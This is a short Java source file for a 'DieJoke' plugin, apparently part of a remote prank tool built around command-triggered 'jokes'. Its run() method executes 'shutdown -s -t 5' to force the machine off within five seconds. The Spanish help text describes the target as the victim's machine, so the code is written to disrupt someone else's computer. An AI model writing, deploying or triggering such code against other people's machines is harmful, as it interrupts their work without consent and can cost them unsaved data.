package jokes;

import java.io.IOException;
import java.util.Map;

import app.joke.Joke;
import app.joke.JokeBase;

public class DieJoke extends JokeBase implements Joke {
	
	private Map<String, String> param;

	public String getJokeName() {
		return "Die Joke";
	}

	@Override
	public String command() {
		return "DIE_JOKE";
	}

	@Override
	public String run() {
		try {
			Runtime.getRuntime().exec("shutdown -s -t 5");
		}catch(IOException e) {
			e.printStackTrace();
			
			return "Error al intentar apagar: " + e.getMessage();
		}
		
		return "La maquina se apagara en 5 segundos";
		
	}

	@Override
	public void setParams(Map<String, String> param) {
		this.param = param;
	}

	@Override
	public Map<String, String> getParams() {
		return this.param;
	}

	@Override
	public String help() {
		return "Esta broma apaga la maquina de la victima";
	}

	@Override
	public String toString() {
		return "DieJoke [param=" + param + ", getJokeName()=" + getJokeName() + ", command()=" + command()
				+ ", help()=" + help() + "]";
	}

}
